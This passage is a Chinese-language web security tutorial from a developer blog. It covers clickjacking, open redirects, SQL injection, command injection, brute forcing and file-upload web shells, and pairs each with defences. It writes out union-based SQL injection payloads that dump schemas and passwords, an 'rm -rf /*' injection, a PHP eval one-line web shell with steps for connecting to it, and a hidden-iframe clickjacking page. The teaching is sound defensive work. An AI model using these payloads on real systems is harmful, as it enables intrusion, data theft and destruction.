class="line">24</span><br></pre></td><td class="code"><pre><span class="line">iframe &#123;</span><br><span class="line">  width: 1440px;</span><br><span class="line">  height: 900px;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: -0px;</span><br><span class="line">  left: -0px;</span><br><span class="line">  z-index: 2;</span><br><span class="line">  -moz-opacity: 0;</span><br><span class="line">  opacity: 0;</span><br><span class="line">  filter: alpha(opacity=0);</span><br><span class="line">&#125;</span><br><span class="line">button &#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 270px;</span><br><span class="line">  left: 1150px;</span><br><span class="line">  z-index: 1;</span><br><span class="line">  width: 90px;</span><br><span class="line">  height:40px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">......</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>点击脱衣<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://i.youku.com/u/UMjA0NTg4Njcy&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://pic2.zhimg.com/80/v2-f707cdf092aa93c96b584466cac8b69d_hd.jpg#id=ugefo&originHeight=180&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>从上图可知，攻击者通过图片作为页面背景，隐藏了用户操作的真实界面，当你按耐不住好奇点击按钮以后，真正的点击的其实是隐藏的那个页面的订阅按钮，然后就会在你不知情的情况下订阅了。</p>
<p><img src="https://pic1.zhimg.com/80/v2-ad9ead59259fbb7a7cd5b271961e02d4_hd.jpg#id=OS6g9&originHeight=276&originWidth=643&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<h3 id="防御方法-3"><a href="#防御方法-3" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h4><p><code>X-FRAME-OPTIONS</code>是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。</p>
<p>该响应头有三个值可选，分别是</p>
<ul>
<li>DENY，表示页面不允许通过 iframe 的方式展示</li>
<li>SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示</li>
<li>ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示</li>
</ul>
<h4 id="JavaScript-防御"><a href="#JavaScript-防御" class="headerlink" title="JavaScript 防御"></a>JavaScript 防御</h4><p>对于某些远古浏览器来说，并不能支持上面的这种方式，那我们只有在点击劫持节点加进 dom（a img iframe）的时候监控并去除。</p>
<ol>
<li>配置本站的白名单域名</li>
<li>在 Body 上绑定 MutationObserver* ，监听 dom 追加的相关事件</li>
<li>remove 掉没有匹配到的域名</li>
<li>上报被删掉的域名 （确定是否误删）</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;click-jack&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (self == top) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;click-jack&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(style);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      top.<span class="property">location</span> = self.<span class="property">location</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。<br>​</p>
<h4 id="保证-cdn-全链路-https"><a href="#保证-cdn-全链路-https" class="headerlink" title="保证 cdn 全链路 https"></a>保证 cdn 全链路 https</h4><p>回源一定也要用 https，因为回源是访问站源，https 对站点的压力会比较大，很多人不走全链路 https，但是很多时候这个环节就会被劫持<br>​</p>
<h4 id="jsonp-获取资源资源去除-js-后缀"><a href="#jsonp-获取资源资源去除-js-后缀" class="headerlink" title="jsonp 获取资源资源去除 js 后缀"></a>jsonp 获取资源资源去除 js 后缀</h4><p>一般 jsonp 请求的都是一个服务端接口，然后服务端返回你一段代码，里面包含了一个可执行的 callbackname。请求 js 文件的时候不带 js 后缀，在 script 上增加一个 type，解析还是正常 js 代码。运营商劫持大概率通过后缀识别劫持的。不用 js 文件加载页面 js 可以绕过。</p>
<h2 id="URL-跳转漏洞"><a href="#URL-跳转漏洞" class="headerlink" title="URL 跳转漏洞"></a>URL 跳转漏洞</h2><p>定义：借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>黑客利用 URL 跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在 QQ 群或者是浏览量多的贴吧/论坛中。<br>安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。</p>
<p><img src="https://pic4.zhimg.com/80/v2-eeef7a581d7287456102267effd983ab_hd.jpg#id=jr9h5&originHeight=134&originWidth=741&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。</p>
<p><img src="https://pic1.zhimg.com/80/v2-dcd9762b8ded41ecc3c898298716a620_hd.jpg#id=LVWhw&originHeight=153&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrd</span><br><span class="line">http://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrd</span><br><span class="line">http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd</span><br></pre></td></tr></table></figure>

<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><ul>
<li>Header 头跳转</li>
<li>Javascript 跳转</li>
<li>META 标签跳转</li>
</ul>
<p>这里我们举个 Header 头跳转实现方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;jumpto&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//www.wooyun.org/login.php?jumpto=http://www.evil.com</span></span><br></pre></td></tr></table></figure>

<p>这里用户会认为<code>www.wooyun.org</code>都是可信的，但是点击上述链接将导致用户最终访问<code>www.evil.com</code>这个恶意网址。</p>
<h3 id="防御方法-4"><a href="#防御方法-4" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="referer-的限制"><a href="#referer-的限制" class="headerlink" title="referer 的限制"></a>referer 的限制</h4><p>如果确定传递 URL 参数进入的来源，我们可以通过该方式实现安全限制，保证该 URL 的有效性，避免恶意用户自己生成跳转链接</p>
<h4 id="加入有效性验证-Token"><a href="#加入有效性验证-Token" class="headerlink" title="加入有效性验证 Token"></a>加入有效性验证 Token</h4><p>我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的 Token 对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p>
<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>SQL 注入是一种常见的 Web 安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>我们先举一个万能钥匙的例子来说明其原理：</p>
<p><img src="https://pic1.zhimg.com/80/v2-25fab61ba77534f745fa6272234b593c_hd.jpg#id=RopfN&originHeight=312&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后端的 SQL 语句可能是如下这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> querySQL = <span class="string">`</span></span><br><span class="line"><span class="string">    SELECT *</span></span><br><span class="line"><span class="string">    FROM user</span></span><br><span class="line"><span class="string">    WHERE username=&#x27;<span class="subst">$&#123;username&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">    AND psw=&#x27;<span class="subst">$&#123;password&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="comment">// 接下来就是执行 sql 语句...</span></span><br></pre></td></tr></table></figure>

<p>这是我们经常见到的登录页面，但如果有一个恶意攻击者输入的用户名是 <code>admin&#39; --</code>，密码随意输入，就可以直接登入系统了。why! —-这就是 SQL 注入</p>
<p>我们之前预想的 SQL 语句是:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> psw<span class="operator">=</span><span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>

<p>但是恶意攻击者用奇怪用户名将你的 SQL 语句变成了如下形式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND psw=&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在 SQL 中,<code>&#39; --</code>是闭合和注释的意思，– 是注释后面的内容的意思，所以查询语句就变成了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所谓的万能密码,本质上就是 SQL 注入的一种利用方式。</p>
<p>一次 SQL 注入的过程包括以下几个过程：</p>
<ol>
<li>获取用户请求参数</li>
<li>拼接到代码当中</li>
<li>SQL 语句按照我们构造参数的语义执行成功</li>
</ol>
<p><img src="https://pic4.zhimg.com/80/v2-be9253c625dcb1353567372d0165bf57_hd.jpg#id=YsgvL&originHeight=179&originWidth=716&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>我们会发现 SQL 注入流程中与正常请求服务器类似，只是黑客控制了数据，构造了 SQL 查询，而正常的请求不会 SQL 查询这一步，<strong>SQL 注入的本质:数据和代码未分离，即数据当做了代码来执行。</strong></p>
<p>假如网站后端代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_REQUEST[ &#x27;id&#x27; ];</span><br><span class="line">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>即 将获得 id 参数值，组合成 SQL 语句进行查询，那么就存在 SQL 注入的风险。</p>
<ol>
<li>攻击者通过将 id 参数设置为 1’or’1’=’1 。’或’ 语法使得 WHERE 条件一直成立，结果能查询出 users 表的所有数据。</li>
<li>id 设置为 1’ order by n # ，要求结果以表的第 n 个字段排序，则当 n = 1,2,3…依次执行，出现报错时假设 n=5，即说明该表只有 4 个字段。</li>
<li>通过以下 sql 能挖掘出更多的数据库信息。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查询数据库用户，版本信息:</span><br><span class="line">1&#x27; union select 1,concat(database(),version(),user()) #</span><br><span class="line"></span><br><span class="line">查询所有数据库名字:</span><br><span class="line">1&#x27; union select 1,schema_name from information_schema.schemata #</span><br><span class="line"></span><br><span class="line">查询数据库的表名，0x64767761十六进制转字符为 dvwa:</span><br><span class="line">&#x27; union select 1,table_name from information_schema.tables where table_schema=0x64767761 #</span><br><span class="line"></span><br><span class="line">查询表的字段，0x7573657273十六进制转字符为 users:</span><br><span class="line">&#x27; union select 1,column_name from information_schema.columns where table_name=0x7573657273 #</span><br><span class="line"></span><br><span class="line">查看表的内容:</span><br><span class="line">&#x27; union select user,password from users #</span><br></pre></td></tr></table></figure>

<h3 id="必备条件"><a href="#必备条件" class="headerlink" title="必备条件"></a>必备条件</h3><ul>
<li>可以控制输入的数据</li>
<li>服务器要执行的代码拼接了控制的数据。</li>
</ul>
<p>​</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
<li>获取数据库信息<ul>
<li>管理员后台用户名和密码</li>
<li>获取其他数据库敏感信息：用户名、密码、手机号码、身份证、银行卡信息……</li>
<li>整个数据库：脱裤</li>
</ul>
</li>
<li>获取服务器权限</li>
<li>植入 Webshell，获取服务器后门</li>
<li>读取服务器敏感文件</li>
</ul>
<h3 id="防御方法-5"><a href="#防御方法-5" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
<li><strong>严格限制 Web 应用的数据库的操作权限</strong>，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害</li>
<li><strong>后端代码检查输入的数据是否符合预期</strong>，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。</li>
<li><strong>对进入数据库的特殊字符（’，”，，&lt;，&gt;，&amp;，*，; 等）进行转义处理，或编码转换</strong>。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。</li>
<li><strong>所有的查询语句建议使用数据库提供的参数化查询接口</strong>，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。</li>
</ul>
<h2 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h2><p>OS 命令注入和 SQL 注入差不多，只不过 SQL 注入是针对数据库的，而 OS 命令注入是针对操作系统的。OS 命令注入攻击指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。倘若调用 Shell 时存在疏漏，就可以执行插入的非法命令。</p>
<p>命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过命令注入攻击可执行操作系统上安装着的各种程序。</p>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><img src="https://pic1.zhimg.com/80/v2-78f3e30a0c902152067da516a1039938_hd.jpg#id=dhZdw&originHeight=154&originWidth=657&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>黑客构造命令提交给 web 应用程序，web 应用程序提取黑客构造的命令，拼接到被执行的命令中，因黑客注入的命令打破了原有命令结构，导致 web 应用执行了额外的命令，最后 web 应用程序将执行的结果输出到响应页面中。</p>
<p>我们通过一个例子来说明其原理，假如需要实现一个需求：用户提交一些内容到服务器，然后在服务器执行一些系统命令去返回一个结果给用户</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&quot;mz/child_process&quot;</span>).<span class="property">exec</span>;</span><br><span class="line"><span class="keyword">let</span> params = &#123;</span><br><span class="line">  <span class="comment">/* 用户输入的参数 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br></pre></td></tr></table></figure>

<p>如果 <code>params.repo</code> 传入的是 <code>https://github.com/admin/admin.github.io.git</code> 确实能从指定的 git repo 上下载到想要的代码。<br>但是如果 <code>params.repo</code> 传入的是 <code>https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code> 恰好你的服务是用 root 权限起的就糟糕了。</p>
<h3 id="防御方法-6"><a href="#防御方法-6" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
<li>后端对前端提交内容进行规则限制（比如正则表达式）。</li>
<li>在调用系统命令前对所有传入参数进行命令行参数转义过滤。</li>
<li>不要直接拼接命令语句，借助一些工具做拼接、转义预处理，例如 Node.js 的 <code>shell-escape npm</code>包</li>
</ul>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>本质上就是将密码字典的每一种情况，通过自动化工具进行组合尝试，进而得到密码字典中正确的一项。</p>
<h3 id="演示登录破解"><a href="#演示登录破解" class="headerlink" title="演示登录破解"></a>演示登录破解</h3><p>安装 Burp Suite（以下简称 BS）,设置代理，使得 BS 能够拦截浏览器请求，捕获登录的数据包。 - 进入待破解网站 A，BS 开启拦截，输入账号密码点击登陆，此时请求会由 BS 控制，如下图所示:</p>
<p><img src="https://pic3.zhimg.com/80/v2-a5360fba67b2b26fa0f118e77e4434aa_hd.jpg#id=OkLQe&originHeight=285&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>复制 Raw 数据包到 Intruder 页面，设置数据包中的账号和密码的占位（Add $），在 Payloads 中加载本地字典，Attack type 选择 Cluster bomb，这样每次请求就会从字典中依次加载字符串作为账号和密码去请求。如下图:</p>
<p><img src="https://pic4.zhimg.com/80/v2-1f3a0e8522f0b9d7edd5d110d14564f7_hd.jpg#id=TuQd6&originHeight=299&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>开始攻击之前设置 Option ，便于我们快速找出登录成功的账号密码。经过分析，A 网站登录无论正确错误都会返回 302 状态码，区别在于正确时返回头 Location 字段为 index.php，错误时为 login.php。 - 设置 Grep Match，新增”index.php”，即响应中包含字符串的账号密码组合将被打勾标记。设置 Grep Extract，将响应中 Location 之后的内容都打印出来。如下图:</p>
<p><img src="https://pic3.zhimg.com/80/v2-988535b2a6d99f036bb965c39d140d42_hd.jpg#id=HTibR&originHeight=202&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>可见 admin 和 password 的组合即为正确账号密码。 为了快速出结果，演示中账号密码字典仅五种情况，5*5 = 25 次即可确定是否能破解，实际应用中字典量远大于此。</p>
<h3 id="防御方法-7"><a href="#防御方法-7" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>复杂密码与密码加密</li>
<li>人机识别验证</li>
<li>接口请求次数限制</li>
</ol>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>应用有时需要调用一些执行系统命令的函数。如 PHP 中的 system,exec,shell_exec 等。</p>
<p>如下后台代码，将前端输入框的值作为参数传入，执行 ping 命令，并将执行结果打印。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">$html .= &quot;</span><br><span class="line">&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>此时可构造恶意输入值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com &amp;&amp; whoami</span><br><span class="line">baidu.com &amp;&amp; cd ../ &amp;&amp; pwd</span><br><span class="line">baidu.com &amp;&amp; cd ../ &amp;&amp; ls</span><br></pre></td></tr></table></figure>

<p>实际破坏中原不仅仅是 ‘ls’ 这种无害的命令。</p>
<h3 id="防御方法-8"><a href="#防御方法-8" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>对 Shell 命令中的特殊符号进行替换，如’&amp;’，’|’，’;’,’||’等。</li>
<li>对于确定的输入，比如 IP，明确限制输入值格式。</li>
<li>服务器权限设置。</li>
</ol>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>漏洞利用的三个<strong>重要条件</strong>：</p>
<ol>
<li>可以上传木马文件。</li>
<li>文件能被执行。</li>
<li>上传文件的路径可知。</li>
</ol>
<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ul>
<li>A 网站允许上传任意文件，则构建如下<strong>一句话脚本</strong>，保存为 hack.php 上传到 A 网站。注意 apple 字符串，该字符串可任意设置。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>假设已知 A 网站上传的文件都在/uploads/目录下，可通过<a target="_blank" rel="noopener" href="http://a.com/uploads/hack.php">http://A.com/uploads/hack.php</a>访问该文件。</li>
<li>打开 <strong>中国菜刀</strong> 软件，该软件被安全软件报病毒，谨慎使用。</li>
<li>右键添加 SHELL，填写 <a target="_blank" rel="noopener" href="http://a.com/uploads/hack.php">http://A.com/uploads/hack.php</a> 及 apple 字符串(与 hack.php 保持一致)，点击添加。如下图：</li>
</ul>
<p><img src="https://pic1.zhimg.com/80/v2-310c95a5cc63e1526edd1548ea8b9178_hd.jpg#id=mzoWR&originHeight=394&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<ul>
<li>如果请求成功，则可以读取服务器任意文件,以及运行虚拟终端。如下图：</li>
</ul>
<p><img src="https://pic2.zhimg.com/80/v2-b9818e3cc9a6991dbc52b6813d3e03a9_hd.jpg#id=tq7tr&originHeight=394&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://zoumiaojiang.com/article/common-web-security/">常见 Web 安全攻防总结</a></li>
<li><a target="_blank" rel="noopener" href="https://juejin.im/book/5bdc715fe51d454e755f75ef">前端面试之道</a></li>
<li><a target="_blank" rel="noopener" href="https://book.douban.com/subject/25863515/">图解 Http</a></li>
<li><a target="_blank" rel="noopener" href="https://wetest.qq.com/lab/view/136.html">Web 安全知多少</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32523587/article/details/79613768">web 安全之点击劫持(clickjacking)</a></li>
<li><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/papers-58.html">URL 重定向/跳转漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm">网易 web 白帽子</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56122850">https://zhuanlan.zhihu.com/p/56122850</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/43292233">https://zhuanlan.zhihu.com/p/43292233</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/62135824">https://zhuanlan.zhihu.com/p/62135824</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/27/%E7%AE%97%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/27/%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">算法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-27 10:46:20" itemprop="dateCreated datePublished" datetime="2021-08-27T10:46:20+08:00">2021-08-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:06" itemprop="dateModified" datetime="2022-02-14T19:41:06+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>JS 的 Array 是一个万能的数据结构，为什么这么说呢？因为首先它可以当作一个普通的数组来使用，即通过下标找到数组的元素</p>
<p>然后它可以当作一个栈来使用，我们知道栈的特点是先进后出，栈的基本操作是出栈和入栈</p>
